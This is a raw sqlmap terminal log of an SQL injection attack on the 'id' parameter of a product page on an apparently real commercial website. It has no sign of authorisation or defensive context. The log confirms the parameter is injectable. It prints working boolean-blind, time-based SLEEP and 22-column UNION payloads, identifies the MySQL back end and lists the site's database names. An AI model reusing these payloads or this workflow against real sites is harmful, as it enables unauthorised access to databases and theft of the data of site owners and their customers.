http://passense-cycle.com/product.php?id=1
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.5.151#dev}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:57:41 /2019-05-30/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[00:57:42] [INFO] testing connection to the target URL
[00:57:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:57:43] [INFO] testing if the target URL content is stable
[00:57:43] [INFO] target URL content is stable
[00:57:43] [INFO] testing if GET parameter 'id' is dynamic
[00:57:44] [INFO] GET parameter 'id' appears to be dynamic
[00:57:44] [WARNING] reflective value(s) found and filtering out
[00:57:44] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[00:57:44] [INFO] testing for SQL injection on GET parameter 'id'
[00:57:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:57:45] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="BB")
[00:57:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:57:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[00:57:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:57:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[00:57:47] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[00:57:47] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[00:57:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:57:47] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:57:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:57:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:57:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:57:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:57:47] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:57:47] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[00:57:47] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[00:57:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[00:57:47] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[00:57:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[00:57:48] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[00:57:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[00:57:48] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[00:57:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[00:57:48] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[00:57:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[00:57:48] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[00:57:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[00:57:48] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[00:57:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[00:57:48] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[00:57:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[00:57:49] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[00:57:49] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
[00:57:49] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
[00:57:49] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:57:49] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[00:57:49] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[00:57:49] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[00:57:49] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[00:57:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[00:57:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[00:57:49] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[00:57:49] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[00:57:49] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[00:57:49] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[00:57:49] [INFO] testing 'Oracle error-based - Parameter replace'
[00:57:50] [INFO] testing 'Firebird error-based - Parameter replace'
[00:57:50] [INFO] testing 'MySQL inline queries'
[00:57:50] [INFO] testing 'PostgreSQL inline queries'
[00:57:50] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[00:57:50] [INFO] testing 'Oracle inline queries'
[00:57:50] [INFO] testing 'SQLite inline queries'
[00:57:50] [INFO] testing 'Firebird inline queries'
[00:57:50] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[00:57:50] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[00:57:50] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[00:57:50] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[00:57:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[00:57:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[00:57:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[00:57:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[00:57:51] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[00:57:51] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[00:57:51] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[00:57:51] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[00:57:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[00:57:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[00:57:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[00:57:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
[00:57:51] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[00:57:51] [INFO] testing 'Oracle stacked queries (heavy query)'
[00:57:51] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[00:57:51] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[00:57:51] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[00:57:51] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[00:57:51] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
[00:57:51] [INFO] testing 'IBM DB2 stacked queries (heavy query)'
[00:57:51] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[00:57:52] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[00:57:52] [INFO] testing 'Firebird stacked queries (heavy query - comment)'
[00:57:52] [INFO] testing 'Firebird stacked queries (heavy query)'
[00:57:52] [INFO] testing 'SAP MaxDB stacked queries (heavy query - comment)'
[00:57:52] [INFO] testing 'SAP MaxDB stacked queries (heavy query)'
[00:57:52] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)'
[00:57:52] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query)'
[00:57:52] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query - comment)'
[00:57:52] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query)'
[00:57:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:58:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[00:58:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:58:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:58:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:58:03] [INFO] target URL appears to have 22 columns in query
[00:58:08] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[?1049h[22;0;0t[1;24r(B[m[4l[?7h[H[2J[24;1H[?1049l[23;0;0t[?1l>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 165 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5414=5414

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1558 FROM (SELECT(SLEEP(5)))pNRL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: id=-8471 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707a71,0x53466c684a41634f49596666636d6944784852476e636155794845424568736c73444a516851506a,0x71787a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ErfN
---
[00:58:08] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty
back-end DBMS: MySQL >= 5.0.12
[00:58:08] [INFO] fetching database names
[00:58:08] [WARNING] the SQL query provided does not return any output
[00:58:08] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[00:58:08] [INFO] fetching number of databases
[00:58:08] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:58:08] [INFO] retrieved: 2
[00:58:10] [INFO] retrieved: information_schema
[00:58:39] [INFO] retrieved: passens1_db
available databases [2]:
[*] information_schema
[*] passens1_db

[00:58:57] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 2 times
[00:58:57] [INFO] fetched data logged to text files under '/root/.sqlmap/output/passense-cycle.com'

[*] ending @ 00:58:57 /2019-05-30/

